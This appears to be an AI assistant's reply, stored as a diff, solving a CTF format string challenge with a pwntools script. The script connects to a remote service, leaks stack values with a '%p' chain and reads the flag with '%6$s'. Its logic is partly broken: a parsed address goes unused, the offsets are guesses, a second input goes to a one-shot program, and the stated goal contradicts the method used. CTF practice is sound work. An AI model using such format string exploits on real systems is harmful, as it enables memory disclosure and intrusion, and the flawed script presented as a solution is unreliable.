@@ -1,0 +1,112 @@
+I'm here to help you solve this CTF challenge using pwntools. Based on the provided information, it seems like we're dealing with a format string vulnerability. Let's break down the problem and see how we can exploit it.
+
+First, let's understand the code:
+
+1. The program reads a flag from "flag.txt" and stores it in a buffer `v10`.
+2. It prompts the user with "what's the flag".
+3. It reads a format string from the user using `__isoc99_scanf("%ms", &format)`.
+4. It compares the input format string character by character with the flag.
+5. If they match exactly, it prints "That's right, the flag is [flag]". Otherwise, it prints "You answered: [formatted string]\nBut that was totally wrong lol get rekt".
+
+Our goal is to make the program believe that our input matches the flag, even if it doesn't, by exploiting the format string vulnerability in `printf(format)`.
+
+### Approach
+
+1. **Identify the Vulnerability:**
+   - The program uses `printf(format)` where `format` is controlled by the user. This is a classic format string vulnerability.
+
+2. **Exploit the Vulnerability:**
+   - We need to craft a format string that will make `printf(format)` behave in a way that allows us to leak information or control the program flow.
+   - Since the program compares our input character by character with the flag, we need to make sure that our format string, when printed, matches the flag.
+
+3. **Leak the Flag:**
+   - One way to approach this is to leak the contents of `v10`, which holds the flag, by using format string specifiers to print the memory contents.
+
+### Solution Code
+
+To solve this challenge using pwntools, we'll follow these steps:
+
+1. **Connect to the Remote Service:**
+   - Use `remote` to connect to the service.
+
+2. **Exploit the Format String Vulnerability:**
+   - Craft a format string that leaks the contents of `v10`.
+
+3. **Extract the Flag:**
+   - Parse the leaked information to extract the flag.
+
+Here's the code to achieve this:
+
+```python
+from pwn import *
+
+# Connect to the remote service
+conn = remote('target_ip', target_port)
+
+# Receive initial prompt
+conn.recvuntil('what\'s the flag\n')
+
+# Craft the format string to leak the flag
+# Assuming v10 is stored in memory, we need to find its address
+# For this example, let's assume v10 is at an address that we can leak
+
+# Send the format string
+format_string = b'%p ' * 10  # Adjust the number based on where v10 is located
+conn.sendline(format_string)
+
+# Receive the response
+response = conn.recvuntil('But that was totally wrong lol get rekt\n')
+
+# Parse the leaked addresses
+leaked_addresses = response.split()
+
+# Assuming one of these addresses is the address of v10, we need to identify it
+# For simplicity, let's assume the address is in leaked_addresses[5]
+
+v10_address = int(leaked_addresses[5], 16)
+
+# Now, craft a format string to read the contents of v10
+# We can use %s to print the string at that address
+
+# Calculate the offset to control the printf argument
+# Assuming v10 is at an offset that we can control with the format string
+
+# For example, if v10 is at offset 6, we can use:
+format_string = b'%6$s'
+
+# Send the format string
+conn.sendline(format_string)
+
+# Receive the response
+flag_response = conn.recvuntil('But that was totally wrong lol get rekt\n')
+
+# Extract the flag
+flag = flag_response.split(b'You answered: ')[1].split(b'\n')[0]
+
+print("Flag:", flag)
+
+# Close the connection
+conn.close()
+```
+
+### Explanation
+
+1. **Connecting to the Service:**
+   - We use `remote` to connect to the CTF challenge service.
+
+2. **Leaking Addresses:**
+   - We send a format string that prints multiple addresses (`%p`) to leak memory addresses.
+   - We assume that one of these addresses corresponds to `v10`, where the flag is stored.
+
+3. **Reading the Flag:**
+   - Once we have the address of `v10`, we craft another format string to read the string at that address using `%s`.
+   - We send this format string, and the program prints the flag.
+   - We then extract and print the flag from the response.
+
+### Notes
+
+- You may need to adjust the number of `%p` and the offset in the second format string based on the actual memory layout and the position of `v10`.
+- Ensure that you handle the responses correctly by using `recvuntil` with appropriate delimiters.
+- Test the script locally if possible to fine-tune the offsets and parsing logic.
+
+This should give you a solid starting point to solve the challenge using pwntools. Good luck!
